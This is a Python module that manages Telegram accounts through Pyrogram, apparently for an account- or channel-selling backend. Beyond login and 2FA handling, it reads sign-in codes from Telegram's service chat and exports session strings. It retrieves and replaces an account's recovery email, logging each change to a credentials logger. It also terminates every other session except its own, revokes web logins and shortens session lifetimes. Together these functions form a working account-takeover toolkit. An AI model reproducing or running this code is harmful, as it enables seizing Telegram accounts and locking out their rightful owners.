import asyncio
import os
import re
import time
from collections import defaultdict
from typing import Optional, Dict, Any, Tuple
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid,
    FloodWait,
    EmailUnconfirmed
)
from pyrogram.raw import functions
from backend.core_engine.logger import get_logger

logger = get_logger("PyrogramClient")


def pattern_matches_email(pattern: str, expected_email: str) -> bool:
    """
    Check if a Telegram masked email pattern matches an expected full email.
    Telegram masks emails like: em*******************k@channelsseller.site
    Pattern shows first 2 chars + last char of local part + full domain.
    """
    if not pattern or not expected_email:
        return False
    pattern = pattern.strip().lower()
    expected_email = expected_email.strip().lower()
    if '@' not in pattern or '@' not in expected_email:
        return False
    p_local, p_domain = pattern.rsplit('@', 1)
    e_local, e_domain = expected_email.rsplit('@', 1)
    if p_domain != e_domain:
        return False
    # Extract visible characters (non-asterisk)
    visible_start = ""
    visible_end = ""
    for c in p_local:
        if c == '*':
            break
        visible_start += c
    for c in reversed(p_local):
        if c == '*':
            break
        visible_end = c + visible_end
    if visible_start and not e_local.startswith(visible_start):
        return False
    if visible_end and not e_local.endswith(visible_end):
        return False
    return True


class PyrogramSessionManager:
    
    def __init__(self, api_id: int, api_hash: str, sessions_dir: str = "sessions"):
        self.api_id = api_id
        self.api_hash = api_hash
        
        # Sessions dir kept for reference only - NO files are created
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        self.sessions_dir = os.path.join(base_dir, sessions_dir)
        
        self.active_clients: Dict[str, Client] = {}
        self.phone_code_hashes: Dict[str, str] = {}
        # Per-phone locks for concurrency isolation
        self._locks: Dict[str, asyncio.Lock] = {}
        
        logger.info(f"PyrogramSessionManager initialized (in-memory mode)")
    
    def _get_lock(self, phone: str) -> asyncio.Lock:
        if phone not in self._locks:
            self._locks[phone] = asyncio.Lock()
        return self._locks[phone]
    
    def _get_session_path(self, phone: str) -> str:
        safe_phone = phone.replace("+", "").replace(" ", "")
        return os.path.join(self.sessions_dir, f"pyrogram_{safe_phone}")
    
    async def send_code(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Sending code to {phone}")
        
        safe_phone = phone.replace("+", "").replace(" ", "")
        
        # Create client in-memory only - NO files on disk
        client = Client(
            name=f"login_{safe_phone}",
            api_id=self.api_id,
            api_hash=self.api_hash,
            phone_number=phone,
            in_memory=True
        )
        
        try:
            # Connect to Telegram
            await client.connect()
            logger.info(f"Connected to Telegram for {phone}")
            
            # Check if already authorized
            try:
                me = await client.get_me()
                if me:
                    duration = time.time() - start_time
                    logger.info(f"Already logged in: {phone} (ID: {me.id}, duration: {duration:.2f}s)")
                    self.active_clients[phone] = client
                    return {"status": "already_logged_in", "phone": phone, "user_id": me.id, "duration": duration}
            except Exception as e:
                logger.info(f"Not logged in yet for {phone}: {e}")
            
            # Send verification code
            sent_code = await client.send_code(phone)
            self.phone_code_hashes[phone] = sent_code.phone_code_hash
            self.active_clients[phone] = client
            
            duration = time.time() - start_time
            logger.info(f"Code sent successfully to {phone} (duration: {duration:.2f}s)")
            return {
                "status": "code_sent",
                "phone": phone,
                "phone_code_hash": sent_code.phone_code_hash,
                "duration": duration
            }
            
        except FloodWait as e:
            duration = time.time() - start_time
            logger.error(f"FloodWait: {e.value} seconds (duration: {duration:.2f}s)")
            await client.disconnect()
            return {"status": "error", "error": f"Please wait {e.value} seconds", "duration": duration}
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error sending code: {e} (duration: {duration:.2f}s)")
            try:
                await client.disconnect()
            except:
                pass
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def verify_code(self, phone: str, code: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Verifying code for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found. Please restart authentication."}
        
        phone_code_hash = self.phone_code_hashes.get(phone)
        if not phone_code_hash:
            return {"status": "error", "error": "Phone code hash not found."}
        
        try:
            user = await client.sign_in(phone, phone_code_hash, code)
            duration = time.time() - start_time
            logger.info(f"Successfully signed in: {phone} (User ID: {user.id}, duration: {duration:.2f}s)")
            return {
                "status": "logged_in",
                "user_id": user.id,
                "first_name": user.first_name,
                "phone": phone,
                "duration": duration
            }
            
        except SessionPasswordNeeded:
            duration = time.time() - start_time
            logger.info(f"2FA required for {phone} (duration: {duration:.2f}s)")
            return {"status": "2fa_required", "phone": phone, "duration": duration}
            
        except PhoneCodeInvalid:
            duration = time.time() - start_time
            logger.warning(f"Invalid code for {phone} (duration: {duration:.2f}s)")
            return {"status": "error", "error": "Invalid verification code", "duration": duration}
            
        except PhoneCodeExpired:
            duration = time.time() - start_time
            logger.warning(f"Code expired for {phone} (duration: {duration:.2f}s)")
            return {"status": "error", "error": "Verification code expired", "duration": duration}
        
        except FloodWait as e:
            duration = time.time() - start_time
            logger.warning(f"FloodWait for {phone}: {e.value}s (duration: {duration:.2f}s)")
            return {"status": "error", "error": f"Too many attempts. Wait {e.value} seconds.", "flood_wait": e.value, "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error verifying code: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def verify_2fa(self, phone: str, password: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Verifying 2FA for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            user = await client.check_password(password)
            duration = time.time() - start_time
            logger.info(f"2FA verified for {phone} (User ID: {user.id}, duration: {duration:.2f}s)")
            return {
                "status": "logged_in",
                "user_id": user.id,
                "first_name": user.first_name,
                "phone": phone,
                "duration": duration
            }
            
        except PasswordHashInvalid:
            duration = time.time() - start_time
            logger.warning(f"Invalid 2FA password for {phone} (duration: {duration:.2f}s)")
            return {"status": "error", "error": "Invalid 2FA password", "duration": duration}
        
        except FloodWait as e:
            duration = time.time() - start_time
            logger.warning(f"FloodWait for 2FA {phone}: {e.value}s (duration: {duration:.2f}s)")
            return {"status": "error", "error": f"Too many attempts. Wait {e.value} seconds.", "flood_wait": e.value, "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error verifying 2FA: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def _ensure_connected(self, phone: str) -> Optional[Any]:
        """Ensure client is connected and authorized. Returns client or None."""
        client = self.active_clients.get(phone)
        if not client:
            # No active client - caller must connect via session string first
            return None
        
        if not client.is_connected:
            try:
                await client.connect()
                if not await client.get_me():
                    return None
                self.active_clients[phone] = client
            except Exception as e:
                logger.error(f"Failed to reconnect session for {phone}: {e}")
                return None
        return client
    
    async def get_recovery_email_full(self, phone: str, password: str) -> Optional[str]:
        """
        Get the FULL recovery email address using account.getPasswordSettings.
        Requires knowing the 2FA password.
        Returns the full email or None.
        
        Official API:
        - account.getPasswordSettings(password: InputCheckPasswordSRP) -> account.passwordSettings
        - account.passwordSettings has field: email (string, optional) = the FULL recovery email
        """
        client = self.active_clients.get(phone)
        if not client:
            return None
        
        try:
            from pyrogram.utils import compute_password_check
            
            # Get password info for SRP computation
            password_info = await client.invoke(functions.account.GetPassword())
            
            if not password_info.has_password:
                logger.info(f"No 2FA password set for {phone}, cannot get recovery email")
                return None
            
            # Compute SRP check
            srp_check = compute_password_check(password_info, password)
            
            # Get password settings (contains full email)
            settings = await client.invoke(
                functions.account.GetPasswordSettings(password=srp_check)
            )
            
            recovery_email = getattr(settings, 'email', None)
            if recovery_email:
                logger.info(f"Recovery email for {phone}: {recovery_email}")
            else:
                logger.info(f"No recovery email found in settings for {phone}")
            
            return recovery_email
            
        except Exception as e:
            logger.error(f"Error getting recovery email for {phone}: {e}")
            return None
    
    async def get_security_info(self, phone: str, known_password: str = None) -> Dict[str, Any]:
        """
        Get comprehensive security info for an account.
        
        Official Telegram API fields from account.getPassword():
        - has_password: bool - 2FA password is enabled
        - has_recovery: bool - recovery email is SET and CONFIRMED (but pattern is hidden!)
        - email_unconfirmed_pattern: str - recovery email set but NOT YET CONFIRMED (pattern visible)
        - login_email_pattern: str - LOGIN email (separate feature! NOT recovery email!)
        
        To get the FULL confirmed recovery email, use account.getPasswordSettings(password)
        which requires knowing the 2FA password.
        
        Args:
            phone: Phone number
            known_password: If provided, will fetch the full recovery email address
        """
        start_time = time.time()
        logger.info(f"Getting security info for {phone}")
        
        client = await self._ensure_connected(phone)
        if not client:
            return {"status": "error", "error": "Session not found or expired."}
        
        try:
            # ===== Get sessions/authorizations =====
            authorizations = await client.invoke(functions.account.GetAuthorizations())
            
            sessions = []
            current_session = None
            
            for auth in authorizations.authorizations:
                session_info = {
                    "hash": auth.hash,
                    "device_model": auth.device_model,
                    "platform": auth.platform,
                    "system_version": auth.system_version,
                    "api_id": auth.api_id,
                    "app_name": auth.app_name,
                    "app_version": auth.app_version,
                    "date_created": auth.date_created,
                    "date_active": auth.date_active,
                    "ip": auth.ip,
                    "country": auth.country,
                    "region": auth.region,
                    "is_current": auth.current,
                    "is_official_app": getattr(auth, 'official_app', False),
                    "password_pending": getattr(auth, 'password_pending', False),
                    "encrypted_requests_disabled": getattr(auth, 'encrypted_requests_disabled', False),
                    "call_requests_disabled": getattr(auth, 'call_requests_disabled', False),
                }
                
                if auth.current:
                    current_session = session_info
                else:
                    sessions.append(session_info)
            
            # ===== Get 2FA / password info =====
            password_info = await client.invoke(functions.account.GetPassword())
            
            # --- Recovery email (for 2FA password recovery) ---
            # has_recovery = True means recovery email is SET and CONFIRMED
            # BUT Telegram hides the pattern! We can't see it from getPassword alone.
            has_recovery = getattr(password_info, 'has_recovery', False)
            
            # email_unconfirmed_pattern = recovery email set but NOT YET CONFIRMED
            # Pattern is visible like "t***@gmail.com"
            email_unconfirmed_pattern = getattr(password_info, 'email_unconfirmed_pattern', None) or None
            
            # --- Login email (for passwordless login - SEPARATE feature!) ---
            # This is NOT the recovery email! It's the email used to log in without phone.
            login_email_pattern = getattr(password_info, 'login_email_pattern', None) or None
            
            # --- Pending password reset ---
            pending_reset_date = getattr(password_info, 'pending_reset_date', None)
            
            logger.info(
                f"[{phone}] 2FA Info: has_password={password_info.has_password}, "
                f"has_recovery={has_recovery}, "
                f"recovery_unconfirmed={email_unconfirmed_pattern}, "
                f"login_email={login_email_pattern}, "
                f"pending_reset={pending_reset_date}"
            )
            
            # ===== Get FULL recovery email if password is known =====
            recovery_email_full = None
            if known_password and password_info.has_password:
                recovery_email_full = await self.get_recovery_email_full(phone, known_password)
            
            # Count password_pending sessions (logged in but haven't entered 2FA)
            password_pending_sessions = [s for s in sessions if s.get("password_pending")]
            
            # Get authorization TTL
            auth_ttl_days = getattr(authorizations, 'authorization_ttl_days', None)
            
            security_info = {
                "status": "success",
                # 2FA
                "has_password": password_info.has_password,
                "password_hint": password_info.hint if password_info.has_password else None,
                "pending_reset_date": pending_reset_date,
                # Recovery email (2FA)
                "has_recovery_email": has_recovery,
                "email_unconfirmed_pattern": email_unconfirmed_pattern,
                "recovery_email_full": recovery_email_full,
                # Login email (separate feature)
                "login_email_pattern": login_email_pattern,
                # Sessions
                "current_session": current_session,
                "other_sessions": sessions,
                "other_sessions_count": len(sessions),
                "password_pending_sessions": len(password_pending_sessions),
                "authorization_ttl_days": auth_ttl_days,
            }
            
            duration = time.time() - start_time
            logger.info(f"Security info for {phone}: 2FA={password_info.has_password}, Recovery={has_recovery}, Sessions={len(sessions)} (duration: {duration:.2f}s)")
            security_info["duration"] = duration
            return security_info
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error getting security info: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def terminate_other_sessions(self, phone: str, keep_bot_sessions: bool = True) -> Dict[str, Any]:
        """
        Terminate other sessions for this account.
        
        Args:
            keep_bot_sessions: If True, preserve sessions with same API_ID (our bot sessions).
                               Only terminate sessions from other apps (user sessions).
        """
        start_time = time.time()
        logger.info(f"Terminating other sessions for {phone} (keep_bot={keep_bot_sessions})")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            authorizations = await client.invoke(functions.account.GetAuthorizations())
            
            terminated = 0
            kept_bot = 0
            total_other = 0
            
            for auth in authorizations.authorizations:
                if auth.current:
                    continue
                
                total_other += 1
                
                # Check if this is a bot session (same API_ID as ours)
                is_bot_session = (auth.api_id == self.api_id) if keep_bot_sessions else False
                
                if is_bot_session:
                    kept_bot += 1
                    logger.info(f"Keeping bot session: {auth.device_model} ({auth.app_name}, api_id={auth.api_id})")
                    continue
                
                try:
                    await client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                    terminated += 1
                    logger.info(f"Terminated session: {auth.device_model} ({auth.app_name}, api_id={auth.api_id})")
                except Exception as e:
                    logger.warning(f"Failed to terminate session {auth.hash}: {e}")
            
            duration = time.time() - start_time
            logger.info(f"Terminated {terminated}/{total_other} other sessions, kept {kept_bot} bot sessions (duration: {duration:.2f}s)")
            return {
                "status": "success",
                "terminated_count": terminated,
                "kept_bot_sessions": kept_bot,
                "total_other": total_other,
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error terminating sessions: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def get_last_telegram_code(self, phone: str, max_age_seconds: int = 120) -> Optional[str]:
        """
        Get the latest verification code from Telegram service messages (777000).
        Supports 5 and 6 digit codes. Only returns codes from recent messages.
        
        Args:
            phone: Phone number
            max_age_seconds: Max age of message to consider (default 2 minutes)
        """
        start_time = time.time()
        logger.info(f"Getting last Telegram code for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return None
        
        try:
            import datetime
            # Use naive UTC to match Pyrogram's message.date (which may be naive or aware)
            cutoff_time = datetime.datetime.utcnow() - datetime.timedelta(seconds=max_age_seconds)
            
            async for message in client.get_chat_history(777000, limit=10):
                if not message.text:
                    continue
                
                # Skip old messages (handle both naive and aware datetimes)
                if message.date:
                    msg_date = message.date.replace(tzinfo=None) if message.date.tzinfo else message.date
                    if msg_date < cutoff_time:
                        break
                
                # Match 5-6 digit codes
                codes = re.findall(r'\b(\d{5,6})\b', message.text)
                if codes:
                    duration = time.time() - start_time
                    logger.info(f"Found code in Telegram messages: {codes[0]} (duration: {duration:.2f}s)")
                    return codes[0]
            
            duration = time.time() - start_time
            logger.warning(f"No code found in messages (duration: {duration:.2f}s)")
            return None
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error getting Telegram code: {e} (duration: {duration:.2f}s)")
            return None
    
    async def export_session_string(self, phone: str) -> Optional[str]:
        start_time = time.time()
        client = self.active_clients.get(phone)
        if not client:
            return None
        
        try:
            session_string = await client.export_session_string()
            duration = time.time() - start_time
            logger.info(f"Session string exported for {phone} (duration: {duration:.2f}s)")
            return session_string
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error exporting session string: {e} (duration: {duration:.2f}s)")
            return None
    
    async def enable_2fa(self, phone: str, new_password: str, hint: str = "", email: str = "") -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Enabling 2FA for {phone} (with_email={bool(email)})")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            result = await client.enable_cloud_password(new_password, hint=hint, email=email or None)
            
            duration = time.time() - start_time
            logger.info(f"2FA enabled successfully for {phone} (duration: {duration:.2f}s)")
            return {
                "status": "success",
                "message": "2FA enabled successfully",
                "email_pending": False,
                "duration": duration
            }
            
        except EmailUnconfirmed as e:
            # Per Telegram docs: EMAIL_UNCONFIRMED_X means 2FA was enabled 
            # AND recovery email was set, but email needs confirmation code.
            # This is expected and counts as SUCCESS.
            duration = time.time() - start_time
            code_length = getattr(e, 'value', 0)
            logger.info(f"2FA enabled for {phone}, email needs confirmation (code_length={code_length}, duration: {duration:.2f}s)")
            return {
                "status": "success",
                "message": "2FA enabled, email verification code sent",
                "email_pending": True,
                "code_length": code_length,
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error enabling 2FA: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def change_2fa_password(self, phone: str, current_password: str, new_password: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Changing 2FA password for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            await client.change_cloud_password(current_password, new_password)
            
            duration = time.time() - start_time
            logger.info(f"2FA password changed for {phone} (duration: {duration:.2f}s)")
            return {"status": "success", "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error changing 2FA password: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def _terminate_other_sessions_backup(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Terminating other sessions for {phone} (backup method)")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            from pyrogram.raw import functions
            
            auth_result = await client.invoke(functions.account.GetAuthorizations())
            terminated = 0
            
            for auth in auth_result.authorizations:
                if not auth.current:
                    try:
                        await client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                        terminated += 1
                    except:
                        pass
            
            duration = time.time() - start_time
            logger.info(f"Terminated {terminated} sessions for {phone} (duration: {duration:.2f}s)")
            return {"status": "success", "terminated": terminated, "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error terminating sessions: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def connect_from_string(self, phone: str, session_string: str) -> bool:
        start_time = time.time()
        logger.info(f"Connecting from session string for {phone}")
        
        try:
            safe_phone = phone.replace("+", "").replace(" ", "")
            client = Client(
                name=f"str_{safe_phone}",
                api_id=self.api_id,
                api_hash=self.api_hash,
                session_string=session_string,
                in_memory=True
            )
            
            await client.start()
            self.active_clients[phone] = client
            
            duration = time.time() - start_time
            logger.info(f"Connected from session string for {phone} (duration: {duration:.2f}s)")
            return True
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error connecting from session string: {e} (duration: {duration:.2f}s)")
            return False
    
    async def connect_from_file(self, phone: str) -> bool:
        """Connect using a session file on disk"""
        start_time = time.time()
        session_path = self._get_session_path(phone)
        logger.info(f"Connecting from session file for {phone}: {session_path}")
        
        session_file = session_path + ".session"
        if not os.path.exists(session_file):
            logger.warning(f"Session file not found: {session_file}")
            return False
        
        try:
            client = Client(
                name=session_path,
                api_id=self.api_id,
                api_hash=self.api_hash,
                in_memory=False
            )
            await client.connect()
            
            me = await client.get_me()
            if me:
                self.active_clients[phone] = client
                duration = time.time() - start_time
                logger.info(f"Connected from file for {phone} (ID: {me.id}, duration: {duration:.2f}s)")
                return True
            else:
                await client.disconnect()
                return False
                
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error connecting from file: {e} (duration: {duration:.2f}s)")
            return False
    
    async def disconnect(self, phone: str):
        client = self.active_clients.pop(phone, None)
        if client:
            try:
                if getattr(client, 'is_initialized', False):
                    await client.stop()
                else:
                    await client.disconnect()
                logger.info(f"Disconnected: {phone}")
            except Exception as e:
                logger.error(f"Error disconnecting: {e}")
    
    async def log_out(self, phone: str) -> bool:
        """Log out and destroy the session"""
        client = self.active_clients.get(phone)
        if not client:
            return False
        try:
            await client.log_out()
            self.active_clients.pop(phone, None)
            logger.info(f"Logged out: {phone}")
            return True
        except Exception as e:
            logger.error(f"Error logging out: {e}")
            return False
    
    async def disconnect_all(self):
        for phone in list(self.active_clients.keys()):
            await self.disconnect(phone)
    
    async def cleanup_inactive_clients(self, max_idle_seconds: int = 300) -> int:
        """
        Disconnect clients that are no longer responsive to free RAM.
        Returns number of cleaned up clients.
        """
        cleaned = 0
        for phone in list(self.active_clients.keys()):
            client = self.active_clients.get(phone)
            if not client:
                continue
            try:
                if not client.is_connected:
                    self.active_clients.pop(phone, None)
                    cleaned += 1
                    logger.info(f"Cleaned disconnected client: {phone}")
                    continue
                # Quick ping to check if alive
                await asyncio.wait_for(client.get_me(), timeout=5)
            except (asyncio.TimeoutError, Exception):
                try:
                    if getattr(client, 'is_initialized', False):
                        await client.stop()
                    else:
                        await client.disconnect()
                except:
                    pass
                self.active_clients.pop(phone, None)
                cleaned += 1
                logger.info(f"Cleaned dead client: {phone}")
        
        if cleaned > 0:
            logger.info(f"Cleanup: removed {cleaned} inactive clients. Active: {len(self.active_clients)}")
        return cleaned
    
    def get_active_count(self) -> int:
        """Get number of active clients in memory"""
        return len(self.active_clients)
    
    async def get_full_password_info(self, phone: str) -> Dict[str, Any]:
        """Get complete password/2FA information including email details"""
        start_time = time.time()
        logger.info(f"Getting full password info for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            password_info = await client.invoke(functions.account.GetPassword())
            
            result = {
                "status": "success",
                "has_password": password_info.has_password,
                "has_recovery": getattr(password_info, 'has_recovery', False),
                "email_unconfirmed_pattern": getattr(password_info, 'email_unconfirmed_pattern', None),
                "login_email_pattern": getattr(password_info, 'login_email_pattern', None),
                "hint": getattr(password_info, 'hint', None),
                "has_secure_values": getattr(password_info, 'has_secure_values', False),
                "pending_reset_date": getattr(password_info, 'pending_reset_date', None),
            }
            
            # Log all available attributes for debugging
            if hasattr(password_info, '__dict__'):
                all_attrs = {k: str(v)[:100] for k, v in vars(password_info).items() if not k.startswith('_')}
                logger.debug(f"All password_info attributes: {all_attrs}")
                result["raw_attributes"] = list(all_attrs.keys())
            
            duration = time.time() - start_time
            result["duration"] = duration
            logger.info(f"Full password info for {phone}: has_2fa={result['has_password']}, has_recovery={result['has_recovery']} (duration: {duration:.2f}s)")
            
            return result
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error getting full password info: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def change_recovery_email(self, phone: str, current_password: str, new_email: str) -> Dict[str, Any]:
        """
        Change the 2FA recovery email to a new email address using high-level API
        Uses change_cloud_password with same password but new email.
        
        Per Telegram docs: EMAIL_UNCONFIRMED_X is returned when email is set
        but needs verification code. This is expected behavior = success.
        """
        start_time = time.time()
        logger.info(f"Changing recovery email for {phone} to {new_email}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            await client.change_cloud_password(
                current_password=current_password,
                new_password=current_password,
                new_hint="",
                email=new_email
            )
            
            duration = time.time() - start_time
            logger.info(f"Recovery email changed for {phone} to {new_email} (duration: {duration:.2f}s)")
            
            from backend.core_engine.credentials_logger import log_credentials
            log_credentials(
                phone=phone,
                action="EMAIL_CHANGE_INITIATED",
                email=new_email,
                extra_data={}
            )
            
            return {
                "status": "success",
                "message": "Email change completed.",
                "email_pending": False,
                "new_email": new_email,
                "duration": duration
            }
            
        except EmailUnconfirmed as e:
            # EMAIL_UNCONFIRMED_X = email was set, verification code sent
            # This is expected and counts as SUCCESS
            duration = time.time() - start_time
            code_length = getattr(e, 'value', 0)
            logger.info(f"Recovery email set for {phone}, needs confirmation (code_length={code_length}, duration: {duration:.2f}s)")
            
            from backend.core_engine.credentials_logger import log_credentials
            log_credentials(
                phone=phone,
                action="EMAIL_CHANGE_INITIATED",
                email=new_email,
                extra_data={"needs_confirmation": True}
            )
            
            return {
                "status": "success",
                "message": "Email set, verification code sent to email.",
                "email_pending": True,
                "code_length": code_length,
                "new_email": new_email,
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error changing recovery email: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def confirm_recovery_email(self, phone: str, code: str) -> Dict[str, Any]:
        """Confirm the new recovery email with the verification code"""
        start_time = time.time()
        logger.info(f"Confirming recovery email for {phone} with code")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            result = await client.invoke(
                functions.account.ConfirmPasswordEmail(code=code)
            )
            
            duration = time.time() - start_time
            logger.info(f"Recovery email confirmed for {phone} (duration: {duration:.2f}s)")
            
            # Log to credentials file
            from backend.core_engine.credentials_logger import log_credentials
            log_credentials(
                phone=phone,
                action="EMAIL_CONFIRMED",
                extra_data={"result": str(result)}
            )
            
            return {
                "status": "success",
                "message": "Recovery email confirmed successfully",
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error confirming recovery email: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def resend_email_code(self, phone: str) -> Dict[str, Any]:
        """Resend the recovery email verification code"""
        start_time = time.time()
        logger.info(f"Resending email verification code for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            result = await client.invoke(functions.account.ResendPasswordEmail())
            
            duration = time.time() - start_time
            logger.info(f"Email code resent for {phone} (duration: {duration:.2f}s)")
            
            return {
                "status": "success",
                "message": "Verification code resent",
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error resending email code: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def cancel_email_change(self, phone: str) -> Dict[str, Any]:
        """Cancel pending email change"""
        start_time = time.time()
        logger.info(f"Cancelling email change for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            result = await client.invoke(functions.account.CancelPasswordEmail())
            
            duration = time.time() - start_time
            logger.info(f"Email change cancelled for {phone} (duration: {duration:.2f}s)")
            
            return {
                "status": "success",
                "message": "Email change cancelled",
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error cancelling email change: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def invalidate_sign_in_codes(self, phone: str, codes: list) -> Dict[str, Any]:
        """
        Invalidate sign-in codes to prevent reuse.
        Should be called after reading codes from 777000 messages.
        """
        start_time = time.time()
        logger.info(f"Invalidating {len(codes)} sign-in codes for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            # Strip any dashes from codes
            clean_codes = [c.replace("-", "").strip() for c in codes if c]
            if not clean_codes:
                return {"status": "success", "message": "No codes to invalidate"}
            
            await client.invoke(
                functions.account.InvalidateSignInCodes(codes=clean_codes)
            )
            
            duration = time.time() - start_time
            logger.info(f"Invalidated {len(clean_codes)} codes for {phone} (duration: {duration:.2f}s)")
            return {"status": "success", "invalidated": len(clean_codes), "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error invalidating codes: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def set_authorization_ttl(self, phone: str, ttl_days: int = 7) -> Dict[str, Any]:
        """
        Set the TTL for inactive sessions.
        Lower TTL = sessions expire faster = forces re-login sooner.
        """
        start_time = time.time()
        logger.info(f"Setting authorization TTL to {ttl_days} days for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            await client.invoke(
                functions.account.SetAuthorizationTTL(authorization_ttl_days=ttl_days)
            )
            
            duration = time.time() - start_time
            logger.info(f"Authorization TTL set to {ttl_days} days for {phone} (duration: {duration:.2f}s)")
            return {"status": "success", "ttl_days": ttl_days, "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error setting TTL: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def reset_web_authorizations(self, phone: str) -> Dict[str, Any]:
        """Reset ALL web authorizations (Telegram Web logins)."""
        start_time = time.time()
        logger.info(f"Resetting web authorizations for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            await client.invoke(functions.account.ResetWebAuthorizations())
            
            duration = time.time() - start_time
            logger.info(f"Web authorizations reset for {phone} (duration: {duration:.2f}s)")
            return {"status": "success", "message": "All web authorizations revoked", "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error resetting web authorizations: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def get_me_info(self, phone: str) -> Dict[str, Any]:
        """Get current user info including Telegram ID"""
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            me = await client.get_me()
            return {
                "status": "success",
                "id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "username": me.username,
                "phone": me.phone_number
            }
        except Exception as e:
            return {"status": "error", "error": str(e)}


_session_manager: Optional[PyrogramSessionManager] = None


def get_session_manager(api_id: int = None, api_hash: str = None) -> PyrogramSessionManager:
    global _session_manager
    if _session_manager is None:
        if api_id is None or api_hash is None:
            raise ValueError("api_id and api_hash required for first initialization")
        _session_manager = PyrogramSessionManager(api_id, api_hash)
    return _session_manager
